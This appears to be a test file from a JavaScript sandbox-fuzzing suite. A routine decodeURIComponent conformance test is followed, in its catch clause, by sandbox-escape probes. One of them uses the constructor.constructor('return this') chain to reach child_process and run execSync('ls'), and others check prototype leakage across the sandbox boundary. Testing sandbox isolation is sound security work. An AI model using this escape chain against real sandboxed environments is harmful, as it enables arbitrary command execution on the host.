try {
    if (decodeURIComponent('%3B') !== ';') {
        $ERROR('#1: decodeURIComponent("%3B") equal ";", not "%3B"');
    }
    if (decodeURIComponent('%2F') !== '/') {
        $ERROR('#2: decodeURIComponent("%2F") equal "/", not "%2F"');
    }
    if (decodeURIComponent('%3F') !== '?') {
        $ERROR('#3: decodeURIComponent("%3F") equal "?", not "%3F"');
    }
    if (decodeURIComponent('%3A') !== ':') {
        $ERROR('#4: decodeURIComponent("%3A") equal ":", not "%3A"');
    }
    if (decodeURIComponent('%40') !== '@') {
        $ERROR('#5: decodeURIComponent("%40") equal "@", not "%40"');
    }
    if (decodeURIComponent('%26') !== '&') {
        $ERROR('#6: decodeURIComponent("%26") equal "&", not "%26"');
    }
    if (decodeURIComponent('%3D') !== '=') {
        $ERROR('#7.1: decodeURIComponent("%3D") equal "=", not "%3D"');
    }
    if (decodeURIComponent('%2B') !== '+') {
        $ERROR('#8.1: decodeURIComponent("%2B") equal "+", not "%2B"');
    }
    if (decodeURIComponent('%24') !== '$') {
        $ERROR('#9: decodeURIComponent("%24") equal "$", not "%24"');
    }
    if (decodeURIComponent('%2C') !== ',') {
        $ERROR('#10: decodeURIComponent("%2C") equal ",", not "%2C"');
    }
    if (decodeURIComponent('%23') !== '#') {
        $ERROR('#11: decodeURIComponent("%23") equal "#", not "%23"');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}